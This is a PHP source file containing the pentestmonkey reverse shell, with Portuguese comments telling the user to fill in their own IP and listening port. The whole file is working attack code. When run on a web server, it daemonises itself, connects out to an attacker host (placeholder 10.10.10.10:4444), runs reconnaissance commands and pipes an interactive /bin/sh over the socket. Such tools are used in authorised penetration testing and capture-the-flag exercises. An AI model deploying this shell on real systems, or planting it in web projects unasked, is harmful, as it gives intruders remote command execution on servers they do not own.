<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007-2021  pentestmonkey@pentestmonkey.net
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation; either version 2 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.10.10';  // <<< MUDE ISSO: COLOQUE O SEU IP AQUI
$port = 4444;       // <<< MUDE ISSO: COLOQUE A PORTA QUE VOCÊ VAI OUVIR
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and exit cleanly from the web server process.
if (function_exists('pcntl_fork')) {
	// Fork and exit parent process if possible
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only work if we are not already a session leader
	if (function_exists('posix_setsid')) {
		if (posix_setsid() == -1) {
			printit("Error: Can't setsid()");
		}
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to fork. Not daemonising. This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// DO THE BUSINESS!
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally proc_open deadlocks when trying to read from the
// pipes with the shell process, either parent or child will block waiting
// for the other to read their pipe.
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we have input on stdin, read it and write it to the shell process
	if (in_array($sock, $read_a)) {
		if ($input = fread($sock, $chunk_size)) {
			fwrite($pipes[0], $input);
		}
	}

	// If we have output on stdout, read it and write to the socket
	if (in_array($pipes[1], $read_a)) {
		if ($input = fread($pipes[1], $chunk_size)) {
			fwrite($sock, $input);
		}
	}

	// If we have output on stderr, read it and write to the socket
	if (in_array($pipes[2], $read_a)) {
		if ($input = fread($pipes[2], $chunk_size)) {
			fwrite($sock, $input);
		}
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but writes to stderr if we are daemonised
function printit ($string) {
	if (!$GLOBALS['daemon']) {
		print "$string\n";
	}
}

?>
